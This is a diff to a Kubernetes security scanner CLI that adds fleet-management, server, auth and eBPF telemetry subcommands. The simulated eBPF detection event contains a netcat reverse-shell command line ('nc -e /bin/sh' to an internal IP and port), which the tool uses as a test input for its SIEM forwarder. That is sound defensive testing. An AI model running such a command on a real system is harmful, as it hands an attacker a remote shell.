@@ -47,6 +47,10 @@ try:
     from .simulation import ThreatSimulationEngine
     from .kubecam import KubeCamEngine, KubeCamFrame, KubeCamFilmstrip
     from .lifecycle import ContainerLifecycleOrchestrator, ContainerLifecycleReport
+    from .auth import EnterpriseAuthManager, ROLE_PLATFORM_ADMIN, ROLE_SECURITY_ENGINEER, ROLE_COMPLIANCE_AUDITOR, ROLE_DEVOPS_OPERATOR
+    from .fleet import FleetManager, ClusterRecord, FleetPolicy
+    from .ebpf import EBPFTelemetryEngine, SIEMForwarder, KernelSecurityEvent
+    from .enterprise_server import EnterpriseServer
 except ImportError:
     from scanner import NativeSecurityScanner, ScanReport
     from container import HybridContainerLayerScanner
@@ -74,6 +78,10 @@ except ImportError:
     from simulation import ThreatSimulationEngine
     from kubecam import KubeCamEngine, KubeCamFrame, KubeCamFilmstrip
     from lifecycle import ContainerLifecycleOrchestrator, ContainerLifecycleReport
+    from auth import EnterpriseAuthManager, ROLE_PLATFORM_ADMIN, ROLE_SECURITY_ENGINEER, ROLE_COMPLIANCE_AUDITOR, ROLE_DEVOPS_OPERATOR
+    from fleet import FleetManager, ClusterRecord, FleetPolicy
+    from ebpf import EBPFTelemetryEngine, SIEMForwarder, KernelSecurityEvent
+    from enterprise_server import EnterpriseServer
 
 
 def print_banner():
@@ -499,6 +507,28 @@ def cmd_cve(args):
 
 def cmd_ebpf(args):
     probe = NativeEBPFKernelProbe()
+    engine = EBPFTelemetryEngine()
+    forwarder = SIEMForwarder(getattr(args, "format", "CEF") or "CEF")
+
+    if getattr(args, "simulate", False):
+        evt = engine.evaluate_execve_event(
+            pid=4192,
+            comm="nc",
+            filename="/usr/bin/nc",
+            args=["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
+            pod_name="payment-svc-6df798",
+            namespace="production",
+        )
+        if evt:
+            forwarder.push(evt)
+            if getattr(args, "cef", False) or getattr(args, "format", "").upper() == "CEF":
+                print(evt.to_cef())
+            elif getattr(args, "syslog", False) or getattr(args, "format", "").upper() == "RFC5424":
+                print(evt.to_rfc5424_syslog())
+            else:
+                print(json.dumps(evt.to_dict(), indent=2))
+        return 0
+
     avail = probe.is_kernel_bpf_available()
     print(f"\n[+] In-Tree eBPF Tracepoint Engine:")
     print(f"    Host Platform : {sys.platform}")
@@ -786,6 +816,99 @@ def cmd_lifecycle(args):
     return 0
 
 
+def cmd_server(args):
+    host = getattr(args, "host", "0.0.0.0") or "0.0.0.0"
+    port = getattr(args, "port", 8443) or 8443
+    print_banner()
+    print(f"[*] Starting Kubernetes Native Security Enterprise Server on http://{host}:{port} ...")
+    print(f"    • Built-in Web Console : http://{host}:{port}/")
+    print(f"    • Prometheus Metrics   : http://{host}:{port}/metrics")
+    print(f"    • REST API Endpoints   : http://{host}:{port}/api/v1/")
+    print(f"    Press Ctrl+C to stop.\n")
+    server = EnterpriseServer(host=host, port=port)
+    server.start(background=False)
+    return 0
+
+
+def cmd_fleet(args):
+    manager = FleetManager(tenant_id=getattr(args, "tenant", "default-tenant") or "default-tenant")
+    action = getattr(args, "action", "overview") or "overview"
+
+    if action == "register":
+        cid = getattr(args, "cluster_id", None) or f"cls-{int(time.time())}"
+        name = getattr(args, "name", None) or "production-cluster"
+        c = manager.register_cluster(
+            cluster_id=cid,
+            name=name,
+            tenant_id=getattr(args, "tenant", "default-tenant") or "default-tenant",
+            cloud_provider=getattr(args, "provider", "aws") or "aws",
+            region=getattr(args, "region", "us-east-1") or "us-east-1",
+        )
+        print(f"[✓] Cluster registered successfully:")
+        print(f"    ID       : {c.cluster_id}")
+        print(f"    Name     : {c.name}")
+        print(f"    Provider : {c.cloud_provider.upper()} ({c.region})")
+        print(f"    Tenant   : {c.tenant_id}")
+        return 0
+
+    if action == "distribute":
+        res = manager.distribute_fleet_policy(getattr(args, "tenant", "default-tenant") or "default-tenant", "pol-default-zerotrust")
+        print(f"[✓] Fleet Zero-Trust Baseline policy distributed to {res['targets_count']} cluster(s).")
+        return 0
+
+    # overview (default)
+    manager.register_cluster("eks-us-east-prod", "EKS US-East Prod", cloud_provider="aws", region="us-east-1")
+    manager.register_cluster("gke-eu-west-prod", "GKE EU-West Prod", cloud_provider="gcp", region="europe-west1")
+
+    summary = manager.get_fleet_summary(getattr(args, "tenant", None))
+    print(f"\n[+] Global Fleet Security Overview:")
+    print(f"    Total Clusters       : {summary.total_clusters}")
+    print(f"    Active Reporting     : {summary.active_clusters}")
+    print(f"    Global Threat Index  : {summary.global_threat_index:.1f}/100.0 (Status: {'HEALTHY' if summary.global_threat_index < 30 else 'ALERT'})")
+    print(f"    Average Fleet Score  : {summary.average_security_score:.1f}%")
+    print(f"    Critical Deficits    : {summary.critical_findings_total}")
+
+    clusters = manager.list_clusters(getattr(args, "tenant", None))
+    print("-" * 80)
+    print(f"{'CLUSTER ID':<22} {'PROVIDER':<10} {'REGION':<15} {'SCORE':<8} {'THREAT':<8} {'STATUS'}")
+    print("-" * 80)
+    for c in clusters:
+        print(f"{c.cluster_id:<22} {c.cloud_provider.upper():<10} {c.region:<15} {c.security_score:<8.1f} {c.threat_index:<8.1f} {c.status}")
+    return 0
+
+
+def cmd_auth(args):
+    auth_mgr = EnterpriseAuthManager(default_tenant=getattr(args, "tenant", "default-tenant") or "default-tenant")
+    action = getattr(args, "action", "token") or "token"
+
+    if action == "token":
+        roles = [getattr(args, "role", ROLE_SECURITY_ENGINEER) or ROLE_SECURITY_ENGINEER]
+        token = auth_mgr.issue_jwt(
+            tenant_id=getattr(args, "tenant", "default-tenant") or "default-tenant",
+            subject=getattr(args, "subject", "admin") or "admin",
+            roles=roles,
+        )
+        print(f"[✓] Bearer JWT Token Issued for subject '{getattr(args, 'subject', 'admin') or 'admin'}':")
+        print(token)
+        return 0
+
+    if action == "api-key":
+        roles = [getattr(args, "role", ROLE_PLATFORM_ADMIN) or ROLE_PLATFORM_ADMIN]
+        key, rec = auth_mgr.generate_api_key(
+            tenant_id=getattr(args, "tenant", "default-tenant") or "default-tenant",
+            subject=getattr(args, "subject", "service-account") or "service-account",
+            roles=roles,
+        )
+        print(f"[✓] Enterprise Cryptographic API Key Generated:")
+        print(f"    Key ID : {rec.key_id}")
+        print(f"    Secret : {key}")
+        print(f"    Roles  : {', '.join(rec.roles)}")
+        print(f"    Expires: {rec.expires_at}")
+        return 0
+
+    return 0
+
+
 def main():
     parser = argparse.ArgumentParser(
         prog="k8s-native-scan",
@@ -891,7 +1014,11 @@ def main():
     p_dash.add_argument("--host", default="127.0.0.1", help="Host address (default: 127.0.0.1)")
 
     # ebpf
-    p_ebpf = subparsers.add_parser("ebpf", help="Inspect in-tree eBPF kernel tracepoint status")
+    p_ebpf = subparsers.add_parser("ebpf", help="Inspect in-tree eBPF kernel tracepoint status & behavioral anomaly detection")
+    p_ebpf.add_argument("--simulate", action="store_true", help="Simulate a real-time kernel security event (e.g. execve interactive shell)")
+    p_ebpf.add_argument("--cef", action="store_true", help="Format event in ArcSight Common Event Format (CEF:0) for Splunk/Sentinel")
+    p_ebpf.add_argument("--syslog", action="store_true", help="Format event in RFC 5424 Syslog format")
+    p_ebpf.add_argument("--format", choices=["CEF", "RFC5424", "JSON"], default="CEF", help="Output format for SIEM forwarder")
 
     # cluster
     p_cls = subparsers.add_parser("cluster", help="Live In-Cluster Security Posture & Vulnerability Scanner (CSPM Engine)")
@@ -978,6 +1105,27 @@ def main():
     p_life.add_argument("-o", "--output", help="Save lifecycle report to JSON file")
     p_life.add_argument("--json", action="store_true", help="Output raw JSON lifecycle report")
 
+    # server
+    p_srv = subparsers.add_parser("server", help="Start Enterprise Multi-Tenant CNAPP REST Server & Multi-Cluster Web Portal")
+    p_srv.add_argument("--port", type=int, default=8443, help="Port to listen on (default: 8443)")
+    p_srv.add_argument("--host", default="0.0.0.0", help="Host interface to bind to (default: 0.0.0.0)")
+
+    # fleet
+    p_flt = subparsers.add_parser("fleet", help="Hyperscale Multi-Cluster Fleet Manager & Central Aggregation Service")
+    p_flt.add_argument("action", nargs="?", default="overview", choices=["overview", "register", "distribute"], help="Action: overview (default), register, or distribute")
+    p_flt.add_argument("--tenant", default="default-tenant", help="Tenant ID filter (default: default-tenant)")
+    p_flt.add_argument("--cluster-id", help="Cluster ID for registration")
+    p_flt.add_argument("--name", help="Human-readable cluster name")
+    p_flt.add_argument("--provider", choices=["aws", "gcp", "azure", "onprem"], default="aws", help="Cloud provider")
+    p_flt.add_argument("--region", default="us-east-1", help="Cloud provider region")
+
+    # auth
+    p_ath = subparsers.add_parser("auth", help="Enterprise Identity, RBAC & API Key Management")
+    p_ath.add_argument("action", nargs="?", default="token", choices=["token", "api-key"], help="Action: token (default) or api-key")
+    p_ath.add_argument("--tenant", default="default-tenant", help="Tenant ID")
+    p_ath.add_argument("--subject", default="admin", help="User or service identity subject")
+    p_ath.add_argument("--role", choices=[ROLE_PLATFORM_ADMIN, ROLE_SECURITY_ENGINEER, ROLE_COMPLIANCE_AUDITOR, ROLE_DEVOPS_OPERATOR], default=ROLE_SECURITY_ENGINEER, help="Assigned enterprise RBAC role")
+
     args = parser.parse_args()
 
     if not args.command:
@@ -1034,6 +1182,12 @@ def main():
         sys.exit(cmd_kubecam(args))
     elif args.command == "lifecycle":
         sys.exit(cmd_lifecycle(args))
+    elif args.command == "server":
+        sys.exit(cmd_server(args))
+    elif args.command == "fleet":
+        sys.exit(cmd_fleet(args))
+    elif args.command == "auth":
+        sys.exit(cmd_auth(args))
 
 
 if __name__ == "__main__":
